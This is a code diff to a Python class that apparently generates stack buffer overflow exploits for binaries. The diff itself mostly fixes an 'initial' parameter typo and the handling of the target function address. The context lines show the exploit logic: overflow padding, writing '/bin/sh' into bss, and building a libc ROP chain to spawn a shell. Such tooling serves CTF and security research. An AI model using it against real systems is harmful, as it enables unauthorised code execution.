@@ -53,7 +53,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
             targetFunc,
             functionExit,
             stackOffset,
-            suffix):
+            suffix,
+            initial):
         self.function = function
         self.binary = binary
         self.libc = libc
@@ -61,7 +62,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         self.stackOffset = stackOffset
         self.functionExit = functionExit
         self.suffix = suffix
-        self.initial = inital
+        self.initial = initial
     
     def __str__(self):
         fields = {
@@ -93,6 +94,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
                 stackOffset = arg["stackOffset"]
                 # TODO: automatically determine "suffix"
                 suffix = options.get("sbo.suffix", None)
+                initial = options.get("sbo.initial", None)
                 if suffix:
                     suffix = suffix.replace("\\n", "\n")
                 if initial:
@@ -134,6 +136,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
     def exploit(self, conn):
         sconn = conn.conn
         function_addr = int(self.function["address"], 16) 
+        target_func = int(self.targetFunc["address"], 16)
         
         prefix = b"A"*abs(self.stackOffset)
 
@@ -153,7 +156,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             sconn.recvuntil(self.initial)
         else:
             logger.info("Navigating to invocation of target input function.")
-            conn.navigate(self.targetFunc)
+            conn.navigate(target_func)
 
         res = sconn.recv()
         logger.debug(f"Initial: {res}")
@@ -185,7 +188,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             sconn.recvuntil(self.initial)
         else:
             logger.info("Navigating to targetFunc.")
-            conn.navigate(self.targetFunc)
+            conn.navigate(target_func)
 
         # send /bin/sh
         target_heap_address = self.binary.bss() + 0x100
@@ -222,7 +225,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.debug(f"Received initial: {initial}")
         else:
             logger.info("Navigating to targetFunc.")
-            conn.navigate(self.targetFunc)
+            conn.navigate(target_func)
 
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
